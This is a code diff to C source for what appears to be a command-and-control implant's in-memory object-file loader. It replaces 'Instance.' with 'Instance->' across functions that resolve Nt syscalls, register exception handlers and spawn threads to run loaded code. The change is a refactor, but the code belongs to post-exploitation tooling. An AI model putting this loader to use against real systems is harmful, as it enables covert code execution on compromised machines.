@@ -193,7 +193,7 @@ BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, P
          * we overwrite the addresses of some Nt apis to provide
          * automatic support for syscalls to BOFs
          */
-        if ( hLibrary == Instance.Modules.Ntdll )
+        if ( hLibrary == Instance->Modules.Ntdll )
         {
             for ( DWORD i = 0 ;; i++ )
             {
@@ -212,7 +212,7 @@ BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, P
         AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
         AnsiString.Buffer        = SymName;
 
-        if ( NT_SUCCESS( Instance.Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
+        if ( NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
             return TRUE;
 
         goto SymbolNotFound;
@@ -261,11 +261,11 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
     ULONG Protection     = 0;
     ULONG BitMask        = 0;
 
-    if ( Instance.Config.Implant.CoffeeVeh )
+    if ( Instance->Config.Implant.CoffeeVeh )
     {
         PUTS( "Register VEH handler..." )
         // Add Veh Debugger in case that our BOF crashes etc.
-        VehHandle = Instance.Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
+        VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
         if ( ! VehHandle )
         {
             PACKAGE_ERROR_WIN32
@@ -385,7 +385,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
 
     // Remove our exception handler
     if ( VehHandle ) {
-        Instance.Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
+        Instance->Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
     }
 
     return TRUE;
@@ -407,14 +407,14 @@ VOID CoffeeCleanup( PCOFFEE Coffee )
     Size    = Coffee->BofSize;
     if ( ! NT_SUCCESS( ( NtStatus = SysNtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
     {
-        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
         PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->ImageBase, NtGetLastError() );
     }
 
     if ( Coffee->SecMap )
     {
         MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
-        Instance.Win32.LocalFree( Coffee->SecMap );
+        Instance->Win32.LocalFree( Coffee->SecMap );
         Coffee->SecMap = NULL;
     }
 }
@@ -641,7 +641,7 @@ SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
 
 VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
 {
-    PCOFFEE Entry = Instance.Coffees;
+    PCOFFEE Entry = Instance->Coffees;
     PCOFFEE Last  = Entry;
 
     if ( ! Coffee )
@@ -649,7 +649,7 @@ VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
 
     if ( Entry && Entry->RequestID == Coffee->RequestID )
     {
-        Instance.Coffees = Entry->Next;
+        Instance->Coffees = Entry->Next;
         return;
     }
 
@@ -690,13 +690,13 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
      * reloc 32-bit offsets to overflow
      */
 
-    Coffee            = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE ) );
+    Coffee            = Instance->Win32.LocalAlloc( LPTR, sizeof( COFFEE ) );
     Coffee->Data      = CoffeeData;
     Coffee->Header    = Coffee->Data;
     Coffee->Symbol    = C_PTR( U_PTR( Coffee->Data ) + Coffee->Header->PointerToSymbolTable );
     Coffee->RequestID = RequestID;
-    Coffee->Next      = Instance.Coffees;
-    Instance.Coffees  = Coffee;
+    Coffee->Next      = Instance->Coffees;
+    Instance->Coffees  = Coffee;
 
 #if _WIN64
 
@@ -716,7 +716,7 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
 
 #endif
 
-    Coffee->SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
+    Coffee->SecMap     = Instance->Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
     Coffee->FunMapSize = CoffeeGetFunMapSize( Coffee );
 
     if ( ! Coffee->SecMap )
@@ -791,7 +791,7 @@ END:
     if ( Coffee )
     {
         MemSet( Coffee, 0, sizeof( Coffee ) );
-        Instance.Win32.LocalFree( Coffee );
+        Instance->Win32.LocalFree( Coffee );
         Coffee = NULL;
     }
 }
@@ -813,9 +813,9 @@ ExitThread:
     }
 
     JobRemove( (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread );
-    Instance.Threads--;
+    Instance->Threads--;
 
-    Instance.Win32.RtlExitUserThread( 0 );
+    Instance->Win32.RtlExitUserThread( 0 );
 }
 
 VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
@@ -829,10 +829,10 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
 #endif
 
     // Allocate memory
-    CoffeeParams                 = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
-    CoffeeParams->EntryName      = Instance.Win32.LocalAlloc( LPTR, EntryNameSize );
-    CoffeeParams->CoffeeData     = Instance.Win32.LocalAlloc( LPTR, CoffeeDataSize );
-    CoffeeParams->ArgData        = Instance.Win32.LocalAlloc( LPTR, ArgSize );
+    CoffeeParams                 = Instance->Win32.LocalAlloc( LPTR, sizeof( COFFEE_PARAMS ) );
+    CoffeeParams->EntryName      = Instance->Win32.LocalAlloc( LPTR, EntryNameSize );
+    CoffeeParams->CoffeeData     = Instance->Win32.LocalAlloc( LPTR, CoffeeDataSize );
+    CoffeeParams->ArgData        = Instance->Win32.LocalAlloc( LPTR, ArgSize );
     CoffeeParams->EntryNameSize  = EntryNameSize;
     CoffeeParams->CoffeeDataSize = CoffeeDataSize;
     CoffeeParams->ArgSize        = ArgSize;
@@ -844,7 +844,7 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
 
     InjectionCtx.Parameter = CoffeeParams;
 
-    Instance.Threads++;
+    Instance->Threads++;
 
     if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(), x64, CoffeeRunnerThread, CoffeeParams, NULL ) ) {
         PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
